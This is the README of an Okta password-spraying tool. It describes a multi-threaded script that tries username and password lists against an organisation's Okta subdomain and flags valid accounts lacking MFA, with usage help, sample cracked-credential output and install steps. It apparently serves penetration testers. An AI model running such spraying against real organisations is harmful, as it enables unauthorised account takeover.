# Okta-Password-Sprayer


The [ShellIntel team](https://www.shellntel.com/) has frequently found that password spraying the Okta portal of an organization will often result in compromised accounts without MFA set up. This script is a multi-threaded Okta password sprayer. Simply provide the script with a subdomain (ie `xyz.okta.com` or simply `xyz`) and a list of usernames and passwords, and the script will password spray and check for valid users and valid users w/o MFA. 

```
┌─[justin@parrot]─[~/projects/Okta-Password-Sprayer]
└──╼ $python oSpray.py --help
usage: oSpray.py [-h] [--threads THREADS] subdomain userList passList

positional arguments:
  subdomain          The subdomain of okta.com to attempt the spray upon.
  userList           The newline delimited list of users to password spray.
  passList           The newline delimited list of passwords to spray.

optional arguments:
  -h, --help         show this help message and exit
  --threads THREADS  Number of threads. Default: 7
```

Sample output:
```
┌─[justin@parrot]─[~/projects/Okta-Password-Sprayer]
└──╼ $python oSpray.py ExampleSub usernameList passwordList
Valid Credentials! aUser:Summer18
Valid Credentials without MFA! bUser:Summer18
```

### Installation
```
git clone https://github.com/Rhynorater/Okta-Password-Sprayer.git
cd Okta-Password-Sprayer/
pip install -r requirements.txt
python oSpray.py --help
```
